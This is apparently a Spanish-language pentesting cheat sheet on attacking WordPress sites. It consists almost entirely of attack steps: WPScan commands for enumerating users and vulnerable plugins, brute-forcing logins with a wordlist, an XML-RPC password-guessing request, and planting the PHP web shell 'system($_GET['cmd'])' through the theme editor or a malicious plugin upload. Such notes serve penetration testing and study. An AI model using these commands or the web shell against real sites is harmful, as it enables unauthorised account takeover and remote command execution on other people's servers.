---
title: "WordPress Hacking"
layout: "single"
category: "Web Hacking"
slug: "web-hacking/wordpress"
date: "2025-11-26"
---

### Enumeración (WPScan)
```bash
# Usuarios, Plugins y Temas vulnerables
wpscan --url http://target.com -e u,vp,vt --api-token <TOKEN>
```

### Fuerza Bruta
**Login:**
```bash
wpscan --url http://target.com -U admin -P rockyou.txt
```

**XML-RPC (Más rápido):**
Si `xmlrpc.php` está habilitado.
```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass123</value></param>
</params>
</methodCall>
```

### RCE: Subir Shell
1.  **Theme Editor:** *Appearance > Theme Editor*. Edita `404.php` o `footer.php`.
    ```php
    <?php system($_GET['cmd']); ?>
    ```
2.  **Plugin Malicioso:** Sube un `.zip` con la shell dentro.
